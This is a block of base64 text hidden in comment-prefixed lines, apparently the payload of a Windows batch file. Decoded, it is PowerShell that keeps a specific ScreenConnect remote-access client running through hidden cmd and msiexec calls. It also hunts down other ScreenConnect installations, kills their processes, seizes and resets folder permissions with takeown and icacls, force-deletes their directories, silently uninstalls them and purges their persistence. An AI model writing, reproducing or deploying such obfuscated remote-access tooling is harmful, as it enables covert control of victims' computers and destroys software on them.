::bCAyPiYxIg0KICAgICRsaW5lcyArPSAnZXhpdCcNCiAgICBTZXQtQ29udGVudCAt
::TGl0ZXJhbFBhdGggJGNtZCAtVmFsdWUgJGxpbmVzIC1FbmNvZGluZyBBU0NJSSAt
::Rm9yY2UNCiAgICBTdGFydC1Qcm9jZXNzIGNtZC5leGUgLUFyZ3VtZW50TGlzdCAi
::L2MgYCIkY21kYCIiIC1XaW5kb3dTdHlsZSBIaWRkZW4NCn0NCg0KZnVuY3Rpb24g
::TWFyay1Hcnl4YVJlaW5zdGFsbCB7DQogICAgU2V0LUNvbnRlbnQgLUxpdGVyYWxQ
::YXRoIChKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX3JlaW5zdGFsbC5mbGFnJykg
::LVZhbHVlIChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmcoJ28n
::KSAtRW5jb2RpbmcgQVNDSUkgLUZvcmNlDQp9DQoNCmZ1bmN0aW9uIEdldC1Hcnl4
::YU1pZ3JhdGVPbGRQYXRoIHsgSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YV9taWdy
::YXRlX29sZC50eHQnIH0NCg0KZnVuY3Rpb24gU2F2ZS1Hcnl4YU1pZ3JhdGVPbGQo
::W3N0cmluZ1tdXSRPbGRGcHMsIFtzdHJpbmddJE5ld0ZwKSB7DQogICAgJG9sZHMg
::PSBAKCRPbGRGcHMgfCBXaGVyZS1PYmplY3QgeyAkXyAtYW5kICgkXyAtbmUgJE5l
::d0ZwKSB9IHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlKQ0KICAgIGlmICgtbm90ICRv
::bGRzLkNvdW50KSB7DQogICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAo
::R2V0LUdyeXhhTWlncmF0ZU9sZFBhdGgpIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZQ0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgU2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoIChHZXQtR3J5eGFNaWdyYXRlT2xkUGF0aCkgLVZh
::bHVlICRvbGRzIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCn0NCg0KZnVuY3Rpb24g
::Q29tcGxldGUtR3J5eGFNaWdyYXRlT2xkIHsNCiAgICAjIEw0NDogTkVWRVIgYXV0
::by11bmluc3RhbGwgb2xkIEdyeXhhIEZQIOKAlCB0aGF0IGRyb3BwZWQgbGl2ZSBH
::dWVzdHMgc3RpbGwgb24gb2xkIEZQLg0KICAgICMgS2VlcCB0aGUgZmxhZyBmb3Ig
::dmlzaWJpbGl0eTsgb3BlcmF0b3IvbWFudWFsIGNsZWFudXAgb25seS4NCiAgICAk
::cCA9IEdldC1Hcnl4YU1pZ3JhdGVPbGRQYXRoDQogICAgaWYgKC1ub3QgKFRlc3Qt
::UGF0aCAtTGl0ZXJhbFBhdGggJHApKSB7IHJldHVybiB9DQogICAgJGxvZyA9IEpv
::aW4tUGF0aCAkV29ya0RpciAnZ3J5eGFfZW5zdXJlLmxvZycNCiAgICBBZGQtQ29u
::dGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCd7MH0gbWlncmF0ZV9jbGVh
::bnVwX1NLSVBQRURfTDQ0IChrZWVwIGR1YWwtRlA7IG5ldmVyIC94IGxpdmUgR3J5
::eGEpJyAtZiAoR2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcycp
::KSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIFJlbW92ZS1JdGVt
::IC1MaXRlcmFsUGF0aCAkcCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCn0NCg0KZnVuY3Rpb24gU3RhcnQtR3J5eGFNaWdyYXRlKFtzdHJpbmdd
::JE1zaVBhdGgsIFtzdHJpbmddJE5ld0ZwLCBbc3RyaW5nW11dJE9sZEZwcywgW3N0
::cmluZ10kUmVhc29uKSB7DQogICAgIyBMNDI6IHNpYmxpbmctc2FmZSAvaSBvZiBO
::ZXdGcCBGSVJTVCDigJQga2VlcCBPbGRGcHMgUnVubmluZyB1bnRpbCBDb21wbGV0
::ZS1Hcnl4YU1pZ3JhdGVPbGQuDQogICAgU2F2ZS1Hcnl4YU1pZ3JhdGVPbGQgJE9s
::ZEZwcyAkTmV3RnANCiAgICBDbGVhci1Hcnl4YUFycCAkTmV3RnANCiAgICBTZXQt
::R3J5eGFGcCAkTmV3RnANCiAgICBTdGFydC1Hcnl4YUluc3RhbGwgJE1zaVBhdGgg
::JE5ld0ZwIChKb2luLVBhdGggJFdvcmtEaXIgJ21zaV9ncnl4YV9kZXRhY2hlZC5s
::b2cnKQ0KICAgIE1hcmstR3J5eGFSZWluc3RhbGwNCiAgICByZXR1cm4gIklORkxJ
::R0hUfCROZXdGcHwkUmVhc29uIg0KfQ0KDQpmdW5jdGlvbiBJbnZva2UtR3J5eGFF
::bnN1cmUgew0KICAgICMgTDQ2IEZSRUVaRTogbmV2ZXIgbXNpZXhlYyBmcm9tIG1v
::bi9ib290L2ZvcmNlLWZsYWcuIFN0YXJ0LW9ubHkuIE1hbnVhbCBvd25fZ3J5eGFf
::Zm9yY2UgZm9yIGluc3RhbGwuDQogICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAtTGl0
::ZXJhbFBhdGggJFdvcmtEaXIpKSB7IE5ldy1JdGVtIC1JdGVtVHlwZSBEaXJlY3Rv
::cnkgLVBhdGggJFdvcmtEaXIgLUZvcmNlIHwgT3V0LU51bGwgfQ0KICAgICRsb2cg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ2dyeXhhX2Vuc3VyZS5sb2cnDQogICAgZnVu
::Y3Rpb24gR0xvZyhbc3RyaW5nXSRtKSB7IEFkZC1Db250ZW50IC1MaXRlcmFsUGF0
::aCAkbG9nIC1WYWx1ZSAoJ3swfSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5
::eXl5LU1NLWRkIEhIOm1tOnNzJyksICRtKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZSB9DQoNCiAgICBmb3JlYWNoICgkc3RhbGUgaW4gQCgnZ3J5eGFfaW5z
::dGFsbC5jbWQnLCAnZ3J5eGFfbXNpLmxvY2snLCAnb3duX2dyeXhhLmxvY2snKSkg
::ew0KICAgICAgICAkcCA9IEpvaW4tUGF0aCAkV29ya0RpciAkc3RhbGUNCiAgICAg
::ICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJHApIHsNCiAgICAgICAgICAg
::IEdMb2cgImw0Nl9hYm9ydF9zdGFsZSAkc3RhbGUiDQogICAgICAgICAgICBSZW1v
::dmUtSXRlbSAtTGl0ZXJhbFBhdGggJHAgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkZnAgPSBHZXQt
::R3J5eGFGcA0KICAgICRleHAgPSAkc2NyaXB0OkdyeXhhRXhwZWN0ZWRGcA0KICAg
::IGlmICgtbm90ICRleHApIHsgJGV4cCA9ICRmcCB9DQoNCiAgICAkcnVubmluZyA9
::IEZpbmQtUnVubmluZ0dyeXhhRnANCiAgICBpZiAoJHJ1bm5pbmcpIHsNCiAgICAg
::ICAgU2V0LUdyeXhhRnAgJHJ1bm5pbmcNCiAgICAgICAgR0xvZyAibDQ2X2xpdmVf
::b2sgZnA9JHJ1bm5pbmcgZm9yY2U9JEZvcmNlIGRlZXA9JERlZXAiDQogICAgICAg
::IGlmICgkRGVlcCkgew0KICAgICAgICAgICAgJHRjcFIgPSBUZXN0LVRjcEhvc3RQ
::b3J0ICRzY3JpcHQ6R3J5eGFSZWxheUhvc3QgNDQzDQogICAgICAgICAgICAkdGNw
::VSA9IFRlc3QtVGNwSG9zdFBvcnQgJHNjcmlwdDpHcnl4YVVpSG9zdCA0NDMNCiAg
::ICAgICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ3xydW5uaW5nPTF8ZGVl
::cD0xfHJlbGF5PSR0Y3BSfHVpPSR0Y3BVfGZyZWV6ZT0xIg0KICAgICAgICB9DQog
::ICAgICAgIHJldHVybiAiSEVBTFRIWXwkcnVubmluZ3xydW5uaW5nPTF8ZnJlZXpl
::PTEiDQogICAgfQ0KDQogICAgZm9yZWFjaCAoJHRyeUZwIGluIEAoJGV4cCwgJGZw
::KSB8IFdoZXJlLU9iamVjdCB7ICRfIH0gfCBTZWxlY3QtT2JqZWN0IC1VbmlxdWUp
::IHsNCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtU2NTZXJ2aWNlRXhpc3RzICR0cnlG
::cCkpIHsgY29udGludWUgfQ0KICAgICAgICAkbmFtZSA9ICJTY3JlZW5Db25uZWN0
::IENsaWVudCAoJHRyeUZwKSINCiAgICAgICAgR0xvZyAibDQ2X3N0YXJ0X29ubHkg
::ZnA9JHRyeUZwIg0KICAgICAgICAmIHNjLmV4ZSBjb25maWcgJG5hbWUgc3RhcnQ9
::IGF1dG8gMj4mMSB8IE91dC1OdWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICRu
::YW1lIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25k
::cyA1DQogICAgICAgIGlmIChUZXN0LVNjUnVubmluZyAkdHJ5RnApIHsNCiAgICAg
::ICAgICAgIFNldC1Hcnl4YUZwICR0cnlGcA0KICAgICAgICAgICAgcmV0dXJuICJI
::RUFMVEhZfCR0cnlGcHxzdGFydGVkPTF8ZnJlZXplPTEiDQogICAgICAgIH0NCiAg
::ICB9DQoNCiAgICBHTG9nICJsNDZfYWJzZW50X25vX2F1dG9faW5zdGFsbCB0YXJn
::ZXQ9JGV4cCINCiAgICByZXR1cm4gIlVOSEVBTFRIWXwkZXhwfGFic2VudC1mcmVl
::emUtbm8taW5zdGFsbCINCn0NCg0KZnVuY3Rpb24gSW52b2tlLUV4dGVybWluYXRl
::IHsNCiAgICAjIEw0NTogSEFORFMtT0ZGIOKAlCBkbyBub3QgdG91Y2ggYW55IFNj
::cmVlbkNvbm5lY3Qgd2hpbGUgZGlhZ25vc2luZyBkaXNjb25uZWN0cy4NCiAgICAk
::bG9nID0gSm9pbi1QYXRoICRXb3JrRGlyICdleHRlcm1pbmF0ZS5sb2cnDQogICAg
::QWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICgnezB9IGV4dGVy
::bWluYXRlX1NLSVBQRURfTDQ1IGhhbmRzLW9mZi1hbGwtc2MnIC1mIChHZXQtRGF0
::ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzJykpIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlDQogICAgcmV0dXJuICdTS0lQfGhhbmRzLW9mZi1zYy1M
::NDUnDQogICAgIyBMNzogdHJ1ZSByZW1vdmFsIChkaXNhYmxlZCkuLi4NCiAgICAk
::cnVubmluZ0cgPSBGaW5kLVJ1bm5pbmdHcnl4YUZwDQogICAgaWYgKCRydW5uaW5n
::RykgeyBTZXQtR3J5eGFGcCAkcnVubmluZ0cgfQ0KICAgICRrZWVwID0gQChHZXQt
::S2VlcEZpbmdlcnByaW50cykNCiAgICAkbiA9IEB7IHN2YyA9IDA7IHByb2MgPSAw
::OyBkaXIgPSAwOyBwcm9kdWN0ID0gMDsgcm1tID0gMDsgZmFpbCA9IDAgfQ0KICAg
::IGZ1bmN0aW9uIExvZyhbc3RyaW5nXSRtKSB7DQogICAgICAgICRsaW5lID0gJ3sw
::fSB7MX0nIC1mIChHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNz
::JyksICRtDQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1W
::YWx1ZSAkbGluZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAg
::ICAjIE80MTogZG8gTk9UIFdyaXRlLU91dHB1dCBMb2cgbGluZXMgKHBvbGx1dGVz
::IGZvciAvZiBjYWxsZXJzKQ0KICAgIH0NCiAgICAjIFByb3RlY3QgR3J5eGEgZHVy
::aW5nIHN0YXJ0IHJhY2U6IG9ubHkgbGl2ZSBTQyBwcm9jcyB3aXRoIHZlcmlmaWVk
::IEdyeXhhIHJlbGF5L0ZQDQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nl
::c3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAg
::ICAkYmxvYiA9ICIkKFtzdHJpbmddJF8uRXhlY3V0YWJsZVBhdGgpICQoW3N0cmlu
::Z10kXy5Db21tYW5kTGluZSkiDQogICAgICAgIGlmICgkYmxvYiAtbWF0Y2ggJ1Nj
::cmVlbkNvbm5lY3QgQ2xpZW50IFwoKFswLTlhLWZBLUZdezE2fSlcKScpIHsNCiAg
::ICAgICAgICAgICRmcCA9ICRNYXRjaGVzWzFdLlRvTG93ZXIoKQ0KICAgICAgICAg
::ICAgaWYgKCRmcCAtbm90aW4gJHNjcmlwdDpTZXZyektlZXAgLWFuZCAoVGVzdC1J
::c0dyeXhhRnAgJGZwKSAtYW5kICRmcCAtbm90aW4gJGtlZXApIHsNCiAgICAgICAg
::ICAgICAgICAka2VlcCArPSAkZnANCiAgICAgICAgICAgICAgICBTZXQtR3J5eGFG
::cCAkZnANCiAgICAgICAgICAgICAgICBMb2cgImtlZXBfYWRkX2Zyb21fcHJvYyBm
::cD0kZnAiDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgZnVu
::Y3Rpb24gSXMtS2VlcGVyKFtzdHJpbmddJHMpIHsNCiAgICAgICAgaWYgKC1ub3Qg
::JHMpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgICAgICMgYWxsb3cgaWYgcmVsYXkg
::c2VydmVyL2RvbWFpbiBpcyBHcnl4YSBPUiBmaW5nZXJwcmludCBpcyBhIGtlZXBl
::cg0KICAgICAgICBpZiAoJHMgLW1hdGNoICcoP2kpZ3J5eGFcLmNvbScpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXApIHsgaWYg
::KCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgIHJl
::dHVybiAkZmFsc2UNCiAgICB9DQogICAgZnVuY3Rpb24gRm9yY2UtUmVtb3ZlRGly
::KFtzdHJpbmddJGQpIHsNCiAgICAgICAgaWYgKC1ub3QgJGQgLW9yIC1ub3QgKFRl
::c3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7IHJldHVybiAkdHJ1ZSB9DQogICAg
::ICAgIEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1FcnJvckFjdGlvbiBT
::aWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRf
::LkV4ZWN1dGFibGVQYXRoIC1hbmQgJF8uRXhlY3V0YWJsZVBhdGguU3RhcnRzV2l0
::aCgkZCwgW1N0cmluZ0NvbXBhcmlzb25dOjpPcmRpbmFsSWdub3JlQ2FzZSkgfSB8
::DQogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7IFN0b3AtUHJvY2VzcyAtSWQg
::JF8uUHJvY2Vzc0lkIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZSB9DQogICAgICAgICMgdW4taGFyZCBzZWxmLXByb3RlY3RlZCBkaXJzIChmb3Jl
::aWduL29sZCBTQyBsb2NrcyBBQ0xzK2F0dHJzIHRvIHN1cnZpdmUgcmVtb3ZhbCkN
::CiAgICAgICAgJiB0YWtlb3duLmV4ZSAvRiAkZCAvUiAvRCBZIDI+JjEgfCBPdXQt
::TnVsbA0KICAgICAgICAmIGljYWNscy5leGUgJGQgL3Jlc2V0IC9UIC9DIC9RIDI+
::JjEgfCBPdXQtTnVsbA0KICAgICAgICBjbWQuZXhlIC9jICJhdHRyaWIgLWggLXMg
::LXIgL3MgL2QgYCIkZGAiIGAiJGRcKi4qYCIiIDI+JjEgfCBPdXQtTnVsbA0KICAg
::ICAgICAmIGljYWNscy5leGUgJGQgL2dyYW50ICcqUy0xLTUtMzItNTQ0OihPSSko
::Q0kpRicgL1QgL0MgL1EgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICYgaWNhY2xz
::LmV4ZSAkZCAvZ3JhbnQgJ0FkbWluaXN0cmF0b3JzOihPSSkoQ0kpRicgL1QgL0Mg
::L1EgMj4mMSB8IE91dC1OdWxsDQogICAgICAgICYgaWNhY2xzLmV4ZSAkZCAvZ3Jh
::bnQgJ1NZU1RFTTooT0kpKENJKUYnIC9UIC9DIC9RIDI+JjEgfCBPdXQtTnVsbA0K
::ICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZv
::cmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmIChU
::ZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7DQogICAgICAgICAgICBjbWQuZXhl
::IC9jICJhdHRyaWIgLWggLXMgLXIgL3MgL2QgYCIkZFwqLipgIiIgMj4mMSB8IE91
::dC1OdWxsDQogICAgICAgICAgICBjbWQuZXhlIC9jICJybWRpciAvcyAvcSBgIiRk
::YCIiIDI+JjEgfCBPdXQtTnVsbA0KICAgICAgICB9DQogICAgICAgIGlmIChUZXN0
::LVBhdGggLUxpdGVyYWxQYXRoICRkKSB7DQogICAgICAgICAgICAkZW1wdHkgPSBK
::b2luLVBhdGggJGVudjpURU1QICgib3duX2VtcHR5XyIgKyBbZ3VpZF06Ok5ld0d1
::aWQoKS5Ub1N0cmluZygnTicpKQ0KICAgICAgICAgICAgTmV3LUl0ZW0gLUl0ZW1U
::eXBlIERpcmVjdG9yeSAtUGF0aCAkZW1wdHkgLUZvcmNlIHwgT3V0LU51bGwNCiAg
::ICAgICAgICAgICYgcm9ib2NvcHkuZXhlICRlbXB0eSAkZCAvTUlSIC9SOjAgL1c6
::MCAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRl
::cmFsUGF0aCAkZW1wdHkgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlDQogICAgICAgICAgICBSZW1vdmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJl
::Y3Vyc2UgLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAg
::ICAgIH0NCiAgICAgICAgcmV0dXJuIC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBh
::dGggJGQpDQogICAgfQ0KICAgIGZ1bmN0aW9uIFVuaW5zdGFsbC1Qcm9kdWN0S2V5
::KCRrZXkpIHsNCiAgICAgICAgJGd1aWQgPSAka2V5LlBTQ2hpbGROYW1lDQogICAg
::ICAgICRwcm9wID0gR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAkZG4gPSAkcHJvcC5EaXNw
::bGF5TmFtZQ0KICAgICAgICAjIEwzOS9MNDQ6IHJlZnVzZSAveCBpZiBEaXNwbGF5
::TmFtZSBGUCBpcyBhIGtlZXBlciBPUiBHcnl4YSBQcm9kdWN0Q29kZSAoc2hhcmVk
::IEdVSUQga2lsbHMgR3Vlc3QpDQogICAgICAgIGlmICgkZ3VpZCAtZXEgJ3s5RDdD
::QzQxOC1BMzU2LTk2OTMtRENDNS00MUVDNDREMDNCMzF9Jykgew0KICAgICAgICAg
::ICAgTG9nICJwcm9kdWN0X3NraXBfZ3J5eGFfcHJvZHVjdGNvZGUgZ3VpZD0kZ3Vp
::ZCINCiAgICAgICAgICAgIHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgICAg
::ICBpZiAoJGRuIC1tYXRjaCAnU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgoWzAtOWEt
::ZkEtRl17MTZ9KVwpJykgew0KICAgICAgICAgICAgJGZwRG4gPSAkTWF0Y2hlc1sx
::XS5Ub0xvd2VyKCkNCiAgICAgICAgICAgIGlmICgkZnBEbiAtaW4gJGtlZXAgLW9y
::IChUZXN0LUlzR3J5eGFGcCAkZnBEbikpIHsNCiAgICAgICAgICAgICAgICBMb2cg
::InByb2R1Y3Rfc2tpcF9rZWVwZXJfZnAgWyRkbl0gZ3VpZD0kZ3VpZCINCiAgICAg
::ICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgICAgICB9DQogICAgICAg
::IH0NCiAgICAgICAgaWYgKCRndWlkIC1saWtlICd7Kn0nKSB7DQogICAgICAgICAg
::ICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAi
::L3ggJGd1aWQgL3FuIC9ub3Jlc3RhcnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAt
::V2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbg0KICAgICAgICAgICAg
::TG9nICJwcm9kdWN0X21zaWV4ZWMgWyRkbl0gZ3VpZD0kZ3VpZCBleGl0PSQoJHAu
::RXhpdENvZGUpIg0KICAgICAgICAgICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAx
::NjA1LCAxNjE0LCAzMDEwKSB7IHJldHVybiAkdHJ1ZSB9DQogICAgICAgIH0NCiAg
::ICAgICAgJHVzID0gJHByb3AuVW5pbnN0YWxsU3RyaW5nDQogICAgICAgIGlmICgk
::dXMpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgaWYgKCR1
::cyAtbWF0Y2ggJyg/aSltc2lleGVjJykgew0KICAgICAgICAgICAgICAgICAgICAk
::YXJncyA9ICgkdXMgLXJlcGxhY2UgJyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyon
::LCAnJykNCiAgICAgICAgICAgICAgICAgICAgaWYgKCRhcmdzIC1ub3RtYXRjaCAn
::L3FuJykgeyAkYXJncyA9ICIkYXJncyAvcW4gL25vcmVzdGFydCIgfQ0KICAgICAg
::ICAgICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFy
::Z3VtZW50TGlzdCAkYXJncyAtV2FpdCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhp
::ZGRlbg0KICAgICAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxs
::c3RyaW5nX21zaSBbJGRuXSBleGl0PSQoJHAuRXhpdENvZGUpIg0KICAgICAgICAg
::ICAgICAgICAgICByZXR1cm4gKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0
::LCAzMDEwKQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAg
::ICAgICAgICRwID0gU3RhcnQtUHJvY2VzcyBjbWQuZXhlIC1Bcmd1bWVudExpc3Qg
::Ii9jICR1cyAvUyAvc2lsZW50IC9xdWlldCAvcW4iIC1XYWl0IC1QYXNzVGhydSAt
::V2luZG93U3R5bGUgSGlkZGVuDQogICAgICAgICAgICAgICAgICAgIExvZyAicHJv
::ZHVjdF91bmluc3RhbGxzdHJpbmdfZXhlIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29k
::ZSkiDQogICAgICAgICAgICAgICAgICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWVx
::IDApDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSBjYXRjaCB7IExv
::ZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdfRkFJTCBbJGRuXSAkXyIgfQ0KICAg
::ICAgICB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICAjIOKU
::gOKUgCBkZXN0cm95IGZvcmVpZ24vb2xkIFNDIHBlcnNpc3RlbmNlICh3YXRjaGRv
::ZyB0YXNrcyArIHJ1biBrZXlzKSDilIDilIANCiAgICAjIFJvb3QgY2F1c2Ugb2Yg
::ImNvbm5lY3RzIHRoZW4gZHJvcHMiOiBhIG5vbi1rZWVwZXIgLyBvbGQtRlAgU2Ny
::ZWVuQ29ubmVjdCBrZWVwcyBhDQogICAgIyBzY2hlZHVsZWQgdGFzayBvciBSdW4g
::a2V5IHRoYXQgcmUtcnVucyBpdHMgY2FjaGVkIG1zaWV4ZWMgL2kuIEV2ZXJ5IHN1
::Y2ggL2kgZmlyZXMNCiAgICAjIFJlbW92ZUV4aXN0aW5nUHJvZHVjdHMgb24gdGhl
::IFNIQVJFRCBTQyBVcGdyYWRlQ29kZSBhbmQgc3RyaXBzIHRoZSBrZWVwZXIgR3J5
::eGEuDQogICAgIyBSZW1vdmluZyBvbmx5IHRoZSBwcm9kdWN0IGlzIG5vdCBlbm91
::Z2gg4oCUIHRoZSBwZXJzaXN0ZW5jZSByZWluc3RhbGxzIGl0IChhbmQga2lsbHMN
::CiAgICAjIEdyeXhhIGFnYWluKS4gUHVyZ2UgdGhlIHBlcnNpc3RlbmNlIEZJUlNU
::IHNvIHByb2R1Y3Qvc3ZjL2RpciByZW1vdmFsIGlzIHBlcm1hbmVudC4NCiAgICBm
::dW5jdGlvbiBHZXQtTm9uS2VlcGVyU2NGcHMgew0KICAgICAgICAkZnBzID0gQHt9
::DQogICAgICAgIEdldC1TZXJ2aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRp
::bnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgaWYgKCRfLk5hbWUg
::LW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0p
::XCknKSB7DQogICAgICAgICAgICAgICAgJGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2Vy
::KCldID0gJHRydWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBH
::ZXQtQ2ltSW5zdGFuY2UgV2luMzJfUHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2Ug
::J1NjcmVlbkNvbm5lY3QlJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUg
::fCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoIiQoW3N0cmluZ10k
::Xy5FeGVjdXRhYmxlUGF0aCkgJChbc3RyaW5nXSRfLkNvbW1hbmRMaW5lKSIgLW1h
::dGNoICdcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICAgICAg
::JGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCldID0gJHRydWUNCiAgICAgICAgICAg
::IH0NCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0
::OlVuaW5zdGFsbFJvb3RzKSB7DQogICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1Q
::YXRoICRyb290KSkgeyBjb250aW51ZSB9DQogICAgICAgICAgICBHZXQtQ2hpbGRJ
::dGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFj
::aC1PYmplY3Qgew0KICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3Bl
::cnR5ICRfLlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlz
::cGxheU5hbWUNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1tYXRjaCAnU2NyZWVu
::Q29ubmVjdCBDbGllbnQgXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykgeyAkZnBzWyRt
::YXRjaGVzWzFdLlRvTG93ZXIoKV0gPSAkdHJ1ZSB9DQogICAgICAgICAgICB9DQog
::ICAgICAgIH0NCiAgICAgICAgZm9yZWFjaCAoJGJhc2UgaW4gQCgkZW52OlByb2dy
::YW1GaWxlcywgJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9KSkgew0KICAgICAgICAg
::ICAgaWYgKC1ub3QgJGJhc2UgLW9yIC1ub3QgKFRlc3QtUGF0aCAkYmFzZSkpIHsg
::Y29udGludWUgfQ0KICAgICAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBh
::dGggJGJhc2UgLURpcmVjdG9yeSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICAgICAgaWYg
::KCRfLk5hbWUgLW1hdGNoICdTY3JlZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1m
::QS1GXXsxNn0pXCknKSB7ICRmcHNbJG1hdGNoZXNbMV0uVG9Mb3dlcigpXSA9ICR0
::cnVlIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBAKCRmcHMu
::S2V5cyB8IFdoZXJlLU9iamVjdCB7ICRfIC1ub3RpbiAka2VlcCB9KQ0KICAgIH0N
::Cg0KICAgIGZ1bmN0aW9uIFRlc3QtU2NLZWVwZXJSZWYoW3N0cmluZ10kcykgew0K
